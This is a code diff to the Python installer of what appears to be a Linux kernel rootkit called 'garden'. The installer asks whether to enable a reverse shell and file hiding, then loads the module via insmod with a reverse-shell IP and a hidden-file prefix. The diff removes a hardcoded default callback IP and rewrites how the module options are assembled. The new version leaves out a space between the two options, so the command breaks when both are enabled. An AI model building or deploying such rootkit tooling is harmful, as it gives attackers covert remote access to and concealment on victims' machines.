@@ -69,7 +69,7 @@ def prompt(text, default):
 	"""
 	Prompt with the option to leave the default.
 	"""
-	print_question(text + " [Default: {}]".format(default))
+	print_question(text + " [Default: {}]".format(str(default)))
 	response = input().strip()
 	if response == "":
 		return default
@@ -147,19 +147,14 @@ def load_module(module_path, config):
 	Run $ insmod module, appending any included parameters.
 	"""
 	print_status("Loading module...")
-	if "REVERSE_SHELL_IP" not in config:
-		rev_shell_ip = ""
-	else:
-		rev_shell_ip = config["REVERSE_SHELL_IP"]
+	options = ""
+	if "REVERSE_SHELL_IP" in config and config["REVERSE_SHELL_IP"] is not None:
+		options += "rev_shell_ip=\"{}\"".format(config["REVERSE_SHELL_IP"])
 
-	if "HIDDEN_FILE_PREFIX" not in config:
-		hidden_file_prefix = ""
-	else:
-		hidden_file_prefix = config["HIDDEN_FILE_PREFIX"]
+	if "HIDDEN_FILE_PREFIX" in config:
+		options += "hidden_file_prefix=\"{}\"".format(config["HIDDEN_FILE_PREFIX"])
 
-	cmd = "insmod {} rev_shell_ip=\"{}\" hidden_file_prefix=\"{}\"".format(module_path,
-	                                                                       rev_shell_ip,
-	                                                                       hidden_file_prefix)
+	cmd = "insmod {} {}".format(module_path, options)
 	run_cmd_exit_on_fail(cmd, run_with_os=True)
 
 
@@ -229,7 +224,7 @@ def install(kernel_version):
 	config["MODULE_NAME"] = "garden"
 
 	if prompt_yes_no("Enable reverse shell?"):
-		config["REVERSE_SHELL_IP"] = prompt("Enter IP address for reverse shell.", "222.173.190.239")  # 0xDEADBEEF as an IP address.
+		config["REVERSE_SHELL_IP"] = prompt("Enter IP address for reverse shell.", None)
 
 	if prompt_yes_no("Enable hidden files?"):
 		config["HIDDEN_FILE_PREFIX"] = prompt("Enter prefix for files to hide.", "garden")
@@ -297,4 +292,4 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+	main()
